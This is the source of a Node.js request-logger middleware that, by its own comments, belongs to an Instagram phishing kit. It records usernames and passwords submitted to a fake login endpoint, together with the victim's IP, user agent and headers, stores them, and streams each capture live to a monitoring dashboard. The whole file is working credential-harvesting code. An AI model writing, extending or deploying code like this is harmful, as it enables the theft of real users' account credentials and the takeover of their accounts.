/**
 * Request-logger middleware.
 *
 * Captures every incoming HTTP request, writes it to the JSON log
 * store, and broadcasts the new entry to connected WebSocket clients.
 *
 * Skipped (dashboard housekeeping traffic):
 *   - /api/logs  (Monitor log management)
 *   - /socket.io (WebSocket handshake)
 *   - GET / PUT / DELETE on /api/instagram (Database CRUD)
 *
 * Logged (external / phishing-page traffic):
 *   - POST /api/instagram/login  (credential capture from the phishing page)
 *   - GET /api/health, and any other route
 */
const logStore = require('../utils/logStore');
const { getIo } = require('../config/socket');

function shouldSkip(method, url) {
  if (url.startsWith('/api/logs') || url.startsWith('/socket.io')) return true;
  if (url.startsWith('/api/instagram/otp'))    return true;
  if (url.startsWith('/api/instagram/forgot')) return true;

  // Skip dashboard's internal instagram management calls (GET/PUT/DELETE)
  // but keep POST /api/instagram/login — the credential capture from the phishing page
  if (url.startsWith('/api/instagram') && method !== 'POST') return true;

  return false;
}

function extractIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.socket?.remoteAddress || req.ip || '::1';
}

function requestLogger(req, res, next) {
  if (shouldSkip(req.method, req.originalUrl)) return next();

  const start = Date.now();

  /* Intercept res.json so we can capture the response body */
  const originalJson = res.json;
  let responseBody = null;
  res.json = function (body) {
    responseBody = body;
    return originalJson.call(this, body);
  };

  res.on('finish', () => {
    const ms = Date.now() - start;
    const hasBody = ['POST', 'PUT', 'PATCH'].includes(req.method)
      && req.body
      && Object.keys(req.body).length > 0;

    const entry = {
      timestamp: new Date().toISOString(),
      method: req.method,
      path: req.originalUrl,
      ip: extractIp(req),
      ua: req.get('user-agent') || '',
      status: res.statusCode,
      ms,
      user: req.body?.username || null,
      pass: req.body?.password || null,
      reqHeaders: { ...req.headers },
      reqBody: hasBody ? req.body : null,
      resBody: responseBody ?? null,
    };

    const saved = logStore.add(entry);

    /* Broadcast to every connected monitor client */
    const io = getIo();
    if (io) io.emit('newLog', saved);
  });

  next();
}

module.exports = requestLogger;
